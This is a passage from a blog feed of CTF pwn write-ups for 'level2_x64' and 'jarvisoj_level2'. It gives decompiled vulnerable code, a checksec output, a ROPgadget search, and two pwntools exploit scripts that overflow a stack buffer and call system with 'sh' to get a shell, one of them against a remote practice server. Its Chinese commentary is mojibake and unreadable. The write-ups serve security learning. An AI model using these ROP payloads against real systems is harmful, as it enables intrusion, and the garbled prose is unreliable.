ret</code>ÁöÑgadgetÊâçËÉΩ‰º†ÂèÇ,ËøôÈáåÁî®‰∏ä‰∫ÜROPgadget.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./level2_x64 | grep <span class="string">&#x27;pop rdi&#x27;</span></span><br><span class="line">0x00000000004006b3 : pop rdi ; ret</span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26459</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./level2_x64&#x27;) ##Êú¨Âú∞Â¶πÊúâÊâìÈÄö</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x80</span>+<span class="number">0x8</span></span><br><span class="line">system=<span class="number">0x04004C0</span></span><br><span class="line">bin_sh=<span class="number">0x0600A90</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x4006B3</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Êú¨Âú∞Ê≤°ÊúâÊâìÈÄö,ÂÜôÂæóÈùûÂ∏∏ÈöæÂèóÁöÑÁÆÄÂçïÈ¢ò&lt;/p&gt;
&lt;h2 id=&quot;1-‰º™‰ª£Á†Å&quot;&gt;1.‰º™‰ª£Á†Å&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_level2 1 WP</title>
    <link href="https://www.fomal.cc/posts/cb1b1517.html"/>
    <id>https://www.fomal.cc/posts/cb1b1517.html</id>
    <published>2023-04-02T03:02:22.712Z</published>
    <updated>2023-04-09T06:24:10.903Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-‰º™‰ª£Á†Å">1.‰º™‰ª£Á†Å</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÊºèÊ¥ûÂàÜÊûê">2.ÊºèÊ¥ûÂàÜÊûê</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>Âè™ÂºÄÂêØ‰∫ÜNX‰øùÊä§,Âú®‰º™‰ª£Á†ÅÈáåÈù¢ÂèØ‰ª•ÁúãÂà∞Ë∞ÉÁî®‰∫Ü<code>system</code>Âíå<code>read</code>,ÁÑ∂ÂêéËæìÂÖ•ÊúâÊ†àÊ∫¢Âá∫ÊºèÊ¥û,Áõ¥Êé•Êêû‰∏Ä‰∏ãret2libc1Â∞±Âá∫‰∫Ü,ËØïÁùÄÊâæ‰∏Ä‰∏ãÊúâÊ≤°Êúâ<code>bin/sh</code>ÊàñËÄÖ<code>sh</code>ÁöÑÁâáÊÆµ,Á¨îËÄÖÁî®pwntoolsÁöÑsearchÊâæÂà∞‰∫Ü<code>sh</code>ÁöÑÁâáÊÆµ,‰∏çËøáËøôÈáåÂ¶ÇÊûú‰º†ÂÖ•ÁöÑÊòØ<code>bin/sh</code>ÁöÑÂú∞ÂùÄ‰ºöÊâì‰∏çÈÄö(ËøôÊù°Áõ¥Êé•Âú®ÁªàÁ´ØËæìÂÖ•‰πüÊòØ‰ºöÊä•Âá∫Áõ∏ÂêåÁöÑÈîôËØØ(ÂëΩ‰ª§‰∏çÂ≠òÂú®)),Á¨îËÄÖ‰º†ÂÖ•ÁöÑÊòØ<code>sh</code>Â∞±ÊâìÈÄö‰∫Ü.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x88</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read_addr=elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"></span><br><span class="line">system_addr=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bin_sh=<span class="built_in">next</span>(elf.search(<span class="string">b&#x27;sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system_addr)+p32(<span class="number">6</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-‰º™‰ª£Á†Å&quot;&gt;1.‰º™‰ª£Á†Å&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
</feed>
